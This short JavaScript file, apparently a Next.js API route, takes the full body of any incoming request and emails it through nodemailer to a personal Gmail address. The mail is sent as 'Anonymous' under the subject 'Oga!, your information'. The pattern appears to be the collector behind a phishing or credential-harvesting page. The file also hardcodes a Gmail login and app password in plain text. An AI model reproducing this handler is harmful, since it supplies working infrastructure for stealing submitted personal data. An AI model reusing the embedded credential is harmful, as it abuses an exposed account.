import nodemailer from "nodemailer";

export default async function HandleData(request, response) {
  const options = {
    subject: "Oga!, your information",
    from: "Anonymous",
    to: "ionlyme875@gmail.com",
    html: JSON.stringify(request.body),
  };
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      type: "login",
      user: "infosendle@gmail.com",
      pass: "hbrq ctcj amgd iwmd",
    },
  });
  try {
    await transporter.sendMail(options);
    response.send(200);
  } catch (err) {
    console.log(err.message);
  }
}
